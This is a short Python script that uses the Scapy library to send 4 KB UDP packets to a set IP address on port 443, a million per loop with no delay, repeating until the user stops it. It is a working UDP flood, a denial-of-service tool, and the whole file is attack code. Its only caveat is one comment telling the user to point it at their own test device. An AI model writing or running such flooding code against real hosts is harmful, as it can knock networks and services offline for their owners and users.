import os
os.environ["SCAPY_SUPPRESS_NO_PCAP"] = "1"
from scapy.all import IP, UDP, send
import time

target_ip = "192.168.196.1"  # Change to your own test device's IP
target_port = 443

packet = IP(dst=target_ip) / UDP(dport=target_port) / ("X" * 4096)  # 4 KB payload

packet_count = 1000000  # Send 1,000,000 packets per loop
delay = 0               # No delay between packets

try:
    last_log_time = time.time()
    while True:
        print(f"Sending {packet_count} packets to {target_ip}:{target_port}...")
        for i in range(packet_count):
            send(packet, verbose=False)
            if time.time() - last_log_time >= 10:
                print(f"{i+1} packets sent so far...")
                last_log_time = time.time()
        print("Done. Looping again...")
except KeyboardInterrupt:
    print("Stopped by user.")
